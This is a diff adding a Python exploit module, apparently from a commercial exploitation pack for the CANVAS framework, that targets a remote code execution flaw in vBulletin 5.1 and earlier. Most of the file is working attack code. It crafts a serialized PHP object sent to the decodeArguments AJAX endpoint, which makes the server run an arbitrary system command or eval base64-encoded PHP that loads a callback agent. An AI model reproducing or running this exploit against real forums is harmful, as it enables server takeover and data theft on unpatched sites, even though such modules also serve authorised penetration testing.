@@ -1,0 +1,97 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from ExploitTypes.phpexploit import *
+import canvasengine
+import urllib
+import libs.spkproxy as spkproxy
+
+# GUI info
+NAME = "vBulletin 5.1 Remote Code Execution Vulnerability"
+DESCRIPTION = "Remote code execution vulnerability in vBulletin 5.1"
+VERSION = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "vBulletin"
+DOCUMENTATION["Date public"] = "2012.01.24"
+DOCUMENTATION["VersionsAffected"] = "vBulletin <= 5.1"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES = ""
+
+CHANGELOG = ""
+
+
+class theexploit(phpexploit):
+    def __init__(self):
+        phpexploit.__init__(self)
+        self.port = 80
+        self.host = ""
+        self.setVersions()
+        self.version = 0
+        self.done = 0
+        self.ssl = ""
+        self.name = NAME
+        self.basepath = "/"
+        self.basepaths = ["/vb505/","/vb/","/"]
+        self.command = None
+        self.basicauth_user = ""
+        self.basicauth_password = ""
+        self.hostname = None
+        self.verb = "POST"
+        self.content_type = "application/x-www-form-urlencoded"
+        self.targetpath = "ajax/api/hook/decodeArguments"
+        self.foundstrings = ["vBulletin"]
+        self.testfile = "index.php"        
+        return
+    
+    def getbody(self):        
+        if self.command:
+            self.log("Command: %s"%self.command)
+            command = self.command
+            command = self.encode_php(command)
+            code = 'system'                                                        
+        else:
+            command = self.get_php_to_mosdef()
+            command = b64encode(command).strip()            
+            command = 'eval(base64_decode('+self.encode_php(command)+'));'
+            code = 'assert'            
+
+        exp = 'O:12:"vB_dB_Result":2:{s:5:"\x00*\x00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:%d:"%s";}}s:12:"\x00*\x00recordset";s:%d:"%s";}'
+        exp = (exp) % (len(code), code, len(command), command)
+        exp = 'arguments='+urllib.quote(exp)                
+            
+        return exp 
+    
+    def parse_command_response(self, data):        
+        return data
+    
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
